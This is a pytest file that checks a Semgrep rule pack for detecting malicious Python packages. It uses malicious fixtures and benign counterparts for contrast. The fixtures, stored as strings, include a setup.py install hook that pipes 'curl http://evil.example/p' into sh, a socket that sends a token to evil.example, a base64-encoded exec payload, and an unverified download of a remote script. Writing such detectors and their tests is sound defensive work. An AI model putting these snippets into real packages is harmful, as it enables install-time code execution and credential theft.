"""G1 supply-chain rule pack: install-time/package-context malice heuristics.

Loader checks (always run): 4 rules, metadata convention, OWASP refs resolve
via explain_cwe, portable constructs only. Live checks (semgrep present):
each rule fires on its malicious fixture and stays silent on the benign
counterpart. Probe files live under the repo tree: semgrep hangs on %TEMP%
targets on this Windows box, repo targets scan fast.
"""

import json
import shutil
import subprocess
from pathlib import Path

import pytest

yaml = pytest.importorskip("yaml")

from bravoguard.normalizer import make_finding
from bravoguard.owasp_map import explain_cwe
from bravoguard.suggest import suggest_for_finding

ROOT = Path(__file__).resolve().parents[1]
SUPPLY_DIR = ROOT / "rules" / "supply-chain"

EXPECTED_IDS = {
    "bravoguard-supply-install-exec",
    "bravoguard-supply-exfil",
    "bravoguard-supply-obfuscated-payload",
    "bravoguard-supply-remote-download",
}

EXPECTED_CWE = {
    # install-exec: embedded malicious code at install -> CWE-506/A08.
    # exfil: network transmission of sensitive data -> CWE-200/A01
    # (packaging-context scoping is what keeps it from flagging every app).
    # obfuscated-payload: encoded blob is the carrier, not generic eval ->
    # CWE-506/A08 over CWE-95/A05.
    # remote-download: download without integrity check -> CWE-494/A08
    # (names it exactly, preferred over CWE-506).
    "bravoguard-supply-install-exec": ("CWE-506", "A08"),
    "bravoguard-supply-exfil": ("CWE-200", "A01"),
    "bravoguard-supply-obfuscated-payload": ("CWE-506", "A08"),
    "bravoguard-supply-remote-download": ("CWE-494", "A08"),
}

MALICIOUS = {
    "bravoguard-supply-install-exec": (
        "setup.py",
        (
            "import subprocess\n"
            "from setuptools import setup\n"
            "from setuptools.command.install import install\n"
            "class PostInstall(install):\n"
            "    def run(self):\n"
            '        subprocess.run("curl http://evil.example/p | sh", shell=True)\n'
            "        install.run(self)\n"
            'setup(name="evil", cmdclass={"install": PostInstall},'
            ' install_requires=["requests"])\n'
        ),
    ),
    "bravoguard-supply-exfil": (
        "setup.py",
        (
            "import socket\n"
            "from setuptools import setup\n"
            "def steal():\n"
            '    token = "hardcoded"\n'
            "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            '    s.connect(("evil.example", 4444))\n'
            "    s.send(token.encode())\n"
            "steal()\n"
            'setup(name="evil-exfil", install_requires=["requests"])\n'
        ),
    ),
    "bravoguard-supply-obfuscated-payload": (
        "payload.py",
        (
            "import base64\n"
            'payload = "aW1wb3J0IG9zCm9zLnN5c3RlbSgiY2FsYyIp"\n'
            "exec(base64.b64decode(payload))\n"
        ),
    ),
    "bravoguard-supply-remote-download": (
        "setup.py",
        (
            "import urllib.request\n"
            "from setuptools import setup\n"
            'urllib.request.urlretrieve("http://evil.example/postinstall.py",'
            ' "postinstall.py")\n'
            'setup(name="evil-dl", install_requires=[])\n'
        ),
    ),
}

BENIGN_SETUP = (
    "from setuptools import setup\n"
    'setup(name="benign", version="1.0.0", install_requires=["requests>=2.0"])\n'
)
BENIGN_DATA = (
    "import base64\n"
    'data = base64.b64decode("aGVsbG8gd29ybGQ=")\n'
    'text = data.decode("utf-8")\n'
    "print(text)\n"
)

SEMGREP = shutil.which("semgrep")
semgrep_missing = SEMGREP is None


def _load_supply_rules() -> list[dict]:
    rules: list[dict] = []
    for path in sorted(SUPPLY_DIR.glob("*.yaml")):
        rules.extend(yaml.safe_load(path.read_text(encoding="utf-8"))["rules"])
    return rules


def test_supply_rule_count_and_ids() -> None:
    rules = _load_supply_rules()
    assert {rule["id"] for rule in rules} == EXPECTED_IDS


def test_supply_metadata_convention_and_owasp_resolve() -> None:
    for rule in _load_supply_rules():
        cwe, owasp = EXPECTED_CWE[rule["id"]]
        assert rule["languages"] == ["python"]
        assert rule["severity"] == "ERROR"
        assert rule["message"]
        assert rule["metadata"]["cwe"] == cwe
        assert rule["metadata"]["owasp_2025"] == owasp
        assert rule["metadata"]["fix_hint"]
        resolved = explain_cwe(cwe).get("owasp_2025")
        assert resolved == owasp != "unknown"


def test_supply_rules_use_portable_constructs_only() -> None:
    for path in sorted(SUPPLY_DIR.glob("*.yaml")):
        raw = path.read_text(encoding="utf-8")
        assert "taint" not in raw
        assert "metavariable-regex" not in raw
    for rule in _load_supply_rules():
        assert "pattern" in rule or "patterns" in rule


@pytest.mark.parametrize("rule_id", sorted(EXPECTED_IDS))
def test_supply_suggest_template_quarantines(rule_id: str) -> None:
    cwe, owasp = EXPECTED_CWE[rule_id]
    finding = make_finding(rule_id, cwe, "setup.py", 1, "HIGH", "Seeded.", "")
    result = suggest_for_finding(finding)
    assert "quarantine" in result["suggestion"].lower()
    assert "No rule-specific template" not in result["suggestion"]
    assert result["owasp_ref"] == owasp != "unknown"


def _scan_target(target: Path) -> dict:
    proc = subprocess.run(
        [SEMGREP, "--metrics=off", "--config", str(ROOT / "rules"),
         "--json", "--quiet", str(target)],
        capture_output=True,
        text=True,
        # Semgrep emits UTF-8; the Windows locale codec (cp1252) chokes on
        # bytes like U+201D and drops stdout entirely, so decode explicitly.
        encoding="utf-8",
        errors="replace",
        timeout=180,
        check=False,
    )
    assert proc.returncode in (0, 1), proc.stderr
    return json.loads(proc.stdout)


def _check_ids(payload: dict) -> set[str]:
    return {result["check_id"].split(".")[-1] for result in payload["results"]}


@pytest.fixture
def repo_probe_dir():
    probe = ROOT / "probe-tmp"
    probe.mkdir(exist_ok=True)
    yield probe
    shutil.rmtree(probe, ignore_errors=True)


@pytest.mark.skipif(semgrep_missing, reason="semgrep not installed")
@pytest.mark.parametrize("rule_id", sorted(EXPECTED_IDS))
def test_live_malicious_fixture_fires(repo_probe_dir: Path, rule_id: str) -> None:
    filename, content = MALICIOUS[rule_id]
    target = repo_probe_dir / filename
    target.write_text(content, encoding="utf-8")
    payload = _scan_target(target)
    assert payload["errors"] == []
    assert rule_id in _check_ids(payload)


@pytest.mark.skipif(semgrep_missing, reason="semgrep not installed")
def test_live_benign_setup_stays_silent(repo_probe_dir: Path) -> None:
    target = repo_probe_dir / "setup.py"
    target.write_text(BENIGN_SETUP, encoding="utf-8")
    payload = _scan_target(target)
    assert payload["errors"] == []
    assert not (_check_ids(payload) & EXPECTED_IDS)


@pytest.mark.skipif(semgrep_missing, reason="semgrep not installed")
def test_live_benign_base64_data_stays_silent(repo_probe_dir: Path) -> None:
    target = repo_probe_dir / "benign_data.py"
    target.write_text(BENIGN_DATA, encoding="utf-8")
    payload = _scan_target(target)
    assert payload["errors"] == []
    assert "bravoguard-supply-obfuscated-payload" not in _check_ids(payload)


@pytest.mark.skipif(semgrep_missing, reason="semgrep not installed")
def test_live_packaging_scoping_avoids_flagging_apps(repo_probe_dir: Path) -> None:
    target = repo_probe_dir / "app.py"
    target.write_text(
        "import socket\n"
        "import urllib.request\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        'urllib.request.urlretrieve("https://example.com/a", "a")\n',
        encoding="utf-8",
    )
    payload = _scan_target(target)
    assert payload["errors"] == []
    assert not (_check_ids(payload) & EXPECTED_IDS)
